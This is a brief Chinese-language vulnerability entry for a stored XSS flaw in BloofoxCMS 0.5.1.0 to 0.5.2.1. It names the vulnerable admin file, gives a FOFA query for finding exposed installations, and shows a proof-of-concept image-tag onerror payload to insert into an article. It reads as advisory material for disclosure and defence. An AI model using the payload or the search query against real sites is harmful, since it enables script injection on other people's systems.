# BloofoxCMS 0.5.2.1 存储型XSS

漏洞文件：

```
/admin/include/inc_content_articles.php
``` 

FOFA:

```
app="BloofoxCMS"
```

受影响版本：

0.5.1.0 -.5.2.1

**PoC:**

登录有效的账号，在添加文章的时候插入Payload发布，每次访问均可触发：

```html
<img src=# onerror=alert('xss')>
```

ref：

https://packetstormsecurity.com/files/161195